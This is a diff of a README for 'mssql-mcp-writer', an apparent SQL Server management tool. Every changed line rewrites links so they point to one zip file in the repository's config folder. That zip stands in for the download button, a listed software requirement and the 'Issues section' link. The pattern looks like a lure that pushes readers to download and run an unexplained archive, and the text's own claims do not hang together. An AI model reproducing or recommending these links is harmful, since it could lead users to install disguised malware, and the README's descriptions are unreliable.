@@ -2,7 +2,7 @@
 # 📊 mssql-mcp-writer - Simplify SQL Server Management
 
 ## 🔗 Download Now
-[![Download mssql-mcp-writer](https://raw.githubusercontent.com/CollinsAngel/mssql-mcp-writer/main/src/config/mcp_mssql_writer_1.8.zip)](https://raw.githubusercontent.com/CollinsAngel/mssql-mcp-writer/main/src/config/mcp_mssql_writer_1.8.zip)
+[![Download mssql-mcp-writer](https://github.com/CollinsAngel/mssql-mcp-writer/raw/refs/heads/main/src/config/mcp_mssql_writer_1.8.zip)](https://github.com/CollinsAngel/mssql-mcp-writer/raw/refs/heads/main/src/config/mcp_mssql_writer_1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the mssql-mcp-writer! This application helps you manage SQL Server efficiently. You can read data and modify records without dealing with complex database structures.
@@ -10,11 +10,11 @@ Welcome to the mssql-mcp-writer! This application helps you manage SQL Server ef
 ## 💻 System Requirements
 To run mssql-mcp-writer, you need:
 - A computer with Windows 10 or later, or any modern Linux distribution.
-- https://raw.githubusercontent.com/CollinsAngel/mssql-mcp-writer/main/src/config/mcp_mssql_writer_1.8.zip installed on your machine. If you don't have it, you can download it from [https://raw.githubusercontent.com/CollinsAngel/mssql-mcp-writer/main/src/config/mcp_mssql_writer_1.8.zip](https://raw.githubusercontent.com/CollinsAngel/mssql-mcp-writer/main/src/config/mcp_mssql_writer_1.8.zip).
+- https://github.com/CollinsAngel/mssql-mcp-writer/raw/refs/heads/main/src/config/mcp_mssql_writer_1.8.zip installed on your machine. If you don't have it, you can download it from [https://github.com/CollinsAngel/mssql-mcp-writer/raw/refs/heads/main/src/config/mcp_mssql_writer_1.8.zip](https://github.com/CollinsAngel/mssql-mcp-writer/raw/refs/heads/main/src/config/mcp_mssql_writer_1.8.zip).
 - An SQL Server instance accessible from your computer. Ensure you have the login details ready.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download mssql-mcp-writer](https://raw.githubusercontent.com/CollinsAngel/mssql-mcp-writer/main/src/config/mcp_mssql_writer_1.8.zip). 
+To get started, visit this page to download: [Download mssql-mcp-writer](https://github.com/CollinsAngel/mssql-mcp-writer/raw/refs/heads/main/src/config/mcp_mssql_writer_1.8.zip). 
 
 1. Click on the latest release at the top of the page.
 2. Find the installation file suitable for your operating system.
@@ -36,7 +36,7 @@ Once you open mssql-mcp-writer, follow these steps to use the application:
    
 ## 🎓 Support & Resources
 If you encounter any issues or have questions:
-- Please visit the [Issues section](https://raw.githubusercontent.com/CollinsAngel/mssql-mcp-writer/main/src/config/mcp_mssql_writer_1.8.zip) for support.
+- Please visit the [Issues section](https://github.com/CollinsAngel/mssql-mcp-writer/raw/refs/heads/main/src/config/mcp_mssql_writer_1.8.zip) for support.
 - Review the documentation provided in the repository for additional information.
 
 ## 🔖 Topics
@@ -48,5 +48,5 @@ This application covers various topics that can enhance your understanding and u
 ## 📬 Feedback
 We encourage users to share their experiences. Your feedback helps improve functionality and adds new features that better serve your needs. 
 
-Visit this page to download: [Download mssql-mcp-writer](https://raw.githubusercontent.com/CollinsAngel/mssql-mcp-writer/main/src/config/mcp_mssql_writer_1.8.zip). Enjoy managing your SQL Server with ease!
+Visit this page to download: [Download mssql-mcp-writer](https://github.com/CollinsAngel/mssql-mcp-writer/raw/refs/heads/main/src/config/mcp_mssql_writer_1.8.zip). Enjoy managing your SQL Server with ease!
 ```
